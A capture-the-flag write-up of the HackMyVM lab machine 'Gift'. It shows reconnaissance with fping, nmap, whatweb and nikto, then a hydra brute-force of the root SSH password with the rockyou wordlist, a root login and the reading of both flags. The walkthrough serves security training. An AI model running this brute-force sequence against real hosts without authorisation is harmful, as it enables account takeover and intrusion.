---
title: Write-up Gift on HackMyVM
author: eMVee
date: 2023-09-12 20:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM]
render_with_liquid: false
---

A gift, who doesn't love that? I think everyone likes to receive a gift from time to time. There is an easy machine on HackMyVM called Gift. This machine caught my attention because of the name. Is there an online store where you have to hack something with SQL injection via gifts?

## Getting started

To work neatly, we create a working direcotry before we start our attack.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Gift  

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Gift          
```
We should know our own IP address well.
```bash                                               
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ ip a       
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 485sec preferred_lft 485sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:16:8c:e3:ab brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

## Enumeration
Now we're really going to start! First we start with enumeration of the (virtual) network in which our target is located. We can do this with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.9
10.0.2.15
```
Once we find an IP address for the target, we assign it to a variable called `ip`. This makes working with commands easier.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ ip=10.0.2.9
```
First, let's find out what ports are open and what services are running. We do this with nmap across all ports.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 07:51 CEST
Nmap scan report for 10.0.2.9
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:14:23:D4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 10.0.2.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds

```
Only port 22 and port 80 are open. Usually gate 22 is not interesting to attack right away. Let's update our notes.
- Linux, not yet known which one
- Port 22
    - SSH
    - Openssh 8.3
- Port 80
    - HTTP
    - nginx
    - Title: site doesn't have a title (text/html)

Because port 80 is the most interesting, it makes sense to look into this further first. With whatweb we can get an idea of what technology was used.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ whatweb http://$ip
http://10.0.2.9 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.0.2.9], nginx
```
Unfortunately, we have not become much wiser. Maybe Nikto can find something, although I'm not really convinced at the moment.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ nikto -h http://$ip
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.9
+ Target Hostname:    10.0.2.9
+ Target Port:        80
+ Start Time:         2023-09-12 07:52:52 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-09-12 07:53:14 (GMT2) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto did find something, a `#wp-config.php` file with possible credentials. So let's inspect this.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ curl http://$ip/#wp-config.php#

Dont Overthink. Really, Its simple.
        <!-- Trust me -->

 
```
Okay, I didn't expect this... with little on a website and port 22 still open, a brute force attack on SSH still remains open. We can use Hydra for this with a username `root` and rockyou as a dictionary.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ hydra ssh://$ip -l root -P /usr/share/wordlists/rockyou.txt -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-12 07:55:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.0.2.9:22/
[STATUS] 374.00 tries/min, 374 tries in 00:01h, 14344061 to do in 639:14h, 28 active
[22][ssh] host: 10.0.2.9   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-12 07:56:47


```
Hydra has found a valid pair of credentials. Let's add this to our notes and login.
```
root:simple
```


## Initial access
Time to log in as root via the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Gift]
└─$ ssh root@$ip                       
The authenticity of host '10.0.2.9 (10.0.2.9)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.9' (ED25519) to the list of known hosts.
root@10.0.2.9's password: 
IM AN SSH SERVER
gift:~# 
```
Once we are logged in to the system, we have to check who we are and which machine we are working on.
```bash
gift:~# whoami;id;hostname;ip a;pwd
root
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
gift
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 08:00:27:14:23:d4 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.9/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe14:23d4/64 scope link 
       valid_lft forever preferred_lft forever
/root
gift:~# 

```
We are really root, so we can now capture all the flags.
```bash
gift:~# ls
root.txt  user.txt
gift:~# cat user.txt 
<-- Here is the USER flag -->
gift:~# cat root.txt 
<-- Here is the ROOT flag -->

```